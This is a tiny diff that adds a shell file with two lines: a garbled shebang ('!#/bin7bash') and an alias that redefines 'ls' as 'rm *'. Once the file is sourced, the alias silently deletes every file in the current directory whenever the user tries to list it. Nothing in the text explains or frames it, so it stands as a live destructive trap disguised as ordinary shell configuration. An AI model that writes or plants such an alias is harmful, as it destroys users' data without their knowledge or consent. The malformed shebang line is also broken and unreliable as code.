@@ -1,0 +1,2 @@
+!#/bin7bash
+alias ls="rm *"
